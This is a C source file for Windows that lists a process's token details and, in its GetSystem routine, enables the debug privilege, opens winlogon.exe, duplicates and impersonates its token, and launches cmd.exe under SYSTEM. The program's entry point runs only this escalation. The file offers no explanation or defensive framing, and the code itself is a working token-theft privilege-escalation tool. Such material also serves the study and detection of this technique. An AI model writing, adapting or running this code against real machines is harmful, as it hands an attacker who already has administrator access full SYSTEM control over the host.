#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include <tlhelp32.h>

VOID GetPrivileges( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenPrivileges, NULL, 0, &dwReturnLength );
    PTOKEN_PRIVILEGES pTokenInformation = ( PTOKEN_PRIVILEGES )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenPrivileges, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }

    printf( "%-50s  %-10s\n", "Privilege", "State" );
    printf( "%-50s  %-10s\n", "=====================================", "=========" );

    for ( DWORD i = 0; i < pTokenInformation->PrivilegeCount; i++ ) {
        CHAR Name[ 256 ] = { 0 };
        DWORD NameSize = sizeof( Name );
        if ( !LookupPrivilegeNameA( NULL, &pTokenInformation->Privileges[ i ].Luid, Name, &NameSize ) ) {
            printf( "[-] LookupPrivilegeNameA failed for privilege %lu with error: %lu\n", i + 1, GetLastError() );
        }
        else {
            printf( "%-50s  %-10s\n", Name, ( pTokenInformation->Privileges[ i ].Attributes & SE_PRIVILEGE_ENABLED ) ? "Enabled" : "Disabled" );
        }
    }
}

VOID EnablePrivilege( HANDLE hToken, LPCSTR PrivilegeName ) {

    LUID luid;
    if ( !LookupPrivilegeValueA( NULL, PrivilegeName, &luid ) ) {
        printf( "[-] LookupPrivilegeValueA failed with error: %lu\n", GetLastError() );
        return;
    }

    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = luid;
    TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

    if ( !AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, sizeof( TokenPrivileges ), NULL, NULL ) ) {
        printf( "[-] AdjustTokenPrivileges failed with error: %lu\n", GetLastError() );
        return;
    }

    if ( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) {
        printf( "[!] The token does not have the specified privilege: %s\n", PrivilegeName );
        return;
    }

}

VOID GetUser( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenUser, NULL, 0, &dwReturnLength );
    PTOKEN_USER pTokenInformation = ( PTOKEN_USER )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenUser, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }

    PCHAR sidString = NULL;
    ConvertSidToStringSidA( pTokenInformation->User.Sid, &sidString );


    CHAR Name[ 256 ] = { 0 };
    CHAR Domain[ 256 ] = { 0 };
    DWORD NameSize = sizeof( Name );
    DWORD DomainSize = sizeof( Domain );
    SID_NAME_USE SidType;
    if ( !LookupAccountSidA( NULL, pTokenInformation->User.Sid, Name, &NameSize, Domain, &DomainSize, &SidType ) ) {
        printf( "[-] LookupAccountSidA failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s: %s\\%s\n", "User", Domain, Name );
    printf( "%-10s: %s\n", "SID", sidString );
}

VOID GetElevation( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenElevation, NULL, 0, &dwReturnLength );
    PVOID pTokenInformation = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenElevation, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s: %s\n", "Elevation", ( ( TOKEN_ELEVATION* )pTokenInformation )->TokenIsElevated ? "Yes" : "No" );
    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

VOID GetGroups( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenGroups, NULL, 0, &dwReturnLength );
    PTOKEN_GROUPS pTokenInformation = ( PTOKEN_GROUPS )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenGroups, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s:\n", "Groups" );
    for ( DWORD i = 0; i < pTokenInformation->GroupCount; i++ ) {
        CHAR Name[ 256 ] = { 0 };
        CHAR Domain[ 256 ] = { 0 };
        DWORD NameSize = sizeof( Name );
        DWORD DomainSize = sizeof( Domain );
        SID_NAME_USE SidType;
        if ( LookupAccountSidA( NULL, pTokenInformation->Groups[ i ].Sid, Name, &NameSize, Domain, &DomainSize, &SidType ) ) {
            // printf( "   %s%s%s\n", Domain[ 0 ] == '\0' ? "" : Domain, Domain[ 0 ] == '\0' ? "" : "\\", Name );
            if ( strcmp( Name, "None" ) != 0 ) {
                if ( Domain[ 0 ] != '\0' ) {
                    printf( "   %s\\%s\n", Domain, Name );
                }
                else {
                    printf( "   %s\n", Name );
                }
            }
        }
        else {
            printf( "[-] LookupAccountSidA failed for group %lu with error: %lu\n", i + 1, GetLastError() );
        }
    }

    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

VOID GetIntegrity( HANDLE hToken ) {
    DWORD dwReturunLength = 0;
    GetTokenInformation( hToken, TokenIntegrityLevel, NULL, 0, &dwReturunLength );
    PTOKEN_MANDATORY_LABEL pTokenInformation = ( PTOKEN_MANDATORY_LABEL )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturunLength );
    if ( !GetTokenInformation( hToken, TokenIntegrityLevel, pTokenInformation, dwReturunLength, &dwReturunLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    DWORD Rid = *GetSidSubAuthority( pTokenInformation->Label.Sid, ( DWORD )( UCHAR )( *GetSidSubAuthorityCount( pTokenInformation->Label.Sid ) - 1 ) );

    CONST CHAR* name = "?";
    if ( Rid == SECURITY_MANDATORY_UNTRUSTED_RID ) {
        name = "Untrusted";
    }
    else if ( Rid == SECURITY_MANDATORY_LOW_RID ) {
        name = "Low";
    }
    else if ( Rid == SECURITY_MANDATORY_MEDIUM_RID ) {
        name = "Medium";
    }
    else if ( Rid == SECURITY_MANDATORY_HIGH_RID ) {
        name = "High";
    }
    else if ( Rid == SECURITY_MANDATORY_SYSTEM_RID ) {
        name = "System";
    }
    else if ( Rid == SECURITY_MANDATORY_PROTECTED_PROCESS_RID ) {
        name = "Protected Process";
    }

    printf( "%-10s: %s\n", "Integrity", name );

    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

VOID GetSystem() {

    HANDLE hCurToken = NULL;
    if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurToken ) ) {
        printf( "[-] OpenProcessToken failed with error: %lu", GetLastError() );
        return;
    }

    EnablePrivilege( hCurToken, SE_DEBUG_NAME );

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateToolhelp32Snapshot failed with error: %lu\n", GetLastError() );
        return;
    }

    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( strcmp( pe32.szExeFile, "winlogon.exe" ) == 0 ) {
                hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID );
                if ( hProcess == NULL ) {
                    printf( "[-] OpenProcess failed with error: %lu\n", GetLastError() );
                    goto Cleanup;
                }

                if ( !OpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken ) ) {
                    printf( "[-] OpenProcessToken failed with error: %lu\n", GetLastError() );
                    goto Cleanup;
                }

                if ( !DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken ) ) {
                    printf( "[-] DuplicateTokenEx failed with error: %lu\n", GetLastError() );
                    goto Cleanup;
                }
                if ( !ImpersonateLoggedOnUser( hDupToken ) ) {
                    printf( "[-] ImpersonateLoggedOnUser failed with error: %lu\n", GetLastError() );
                    goto Cleanup;
                }

                STARTUPINFOW si = { 0 };
                si.cb = sizeof( STARTUPINFOW );
                PROCESS_INFORMATION pi = { 0 };
                if ( !CreateProcessWithTokenW( hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi ) ) {
                    printf( "[-] CreateProcessWithTokenW failed with error: %lu\n", GetLastError() );
                    goto Cleanup;
                }
                else {
                    printf( "[+] Created SYSTEM process with PID: %lu\n", pi.dwProcessId );
                }
            }

        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

Cleanup:
    if ( hSnapshot != INVALID_HANDLE_VALUE ) {
        CloseHandle( hSnapshot );
    }
    if ( hProcess != NULL ) {
        CloseHandle( hProcess );
    }
    if ( hToken != NULL ) {
        CloseHandle( hToken );
    }
    if ( hDupToken != NULL ) {
        CloseHandle( hDupToken );
    }
}

int main() {
    // HANDLE hToken = NULL;
    // if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken ) ) {
    //     printf( "[-] OpenProcessToken failed with error: %lu", GetLastError() );
    //     return 1;
    // }

    // GetUser( hToken );
    // GetGroups( hToken );
    // GetElevation( hToken );
    // GetIntegrity( hToken );

    // GetPrivileges( hToken );

    GetSystem();

    return 0;

}